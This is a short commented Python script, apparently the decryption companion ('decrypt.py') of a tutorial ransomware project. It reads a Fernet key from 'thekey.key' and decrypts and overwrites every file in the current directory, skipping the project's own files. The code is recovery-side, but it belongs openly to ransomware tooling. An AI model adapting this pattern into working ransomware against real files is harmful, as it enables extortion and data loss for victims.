import os

from cryptography.fernet import Fernet


#   First step is to find all files in our current directory and store them in a list

files = []

#   Next we'll use a for loop to add all files in the current directory to our files list
for file in os.listdir():
    if file == 'ransomware.py' or file == 'thekey.key' or file == 'decrypt.py':
        continue
    #   We also need to confirm that we are only grabbing files and not directories
    if os.path.isfile(file):
        files.append(file)


#   We'll open the file containing our encryption key, and store the key in a variable
with open("thekey.key","rb") as key:
    decryptkey = key.read()


#   Next we'll decrypt all the files in our file list
for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    decrypted_content = Fernet(decryptkey).decrypt(contents)

    with open(file, 'wb') as thefile:
        thefile.write(decrypted_content)

print(f"Decrpted files: {files} Successfully\n")

"""
In the above snippet, we use a for loop, to iterate over all files in our files list
and for each file, we open it, in read binary mode 'rb', store the contents of the file in  a
variable called contents, then decrypt the contents using Fernet and store the decrypted contents in
another variable decrypted_contents, then again open the same file in write binary mode 'wb', and we'll 
rewrite the decrypted contents to the file, overwriting the existing content
"""
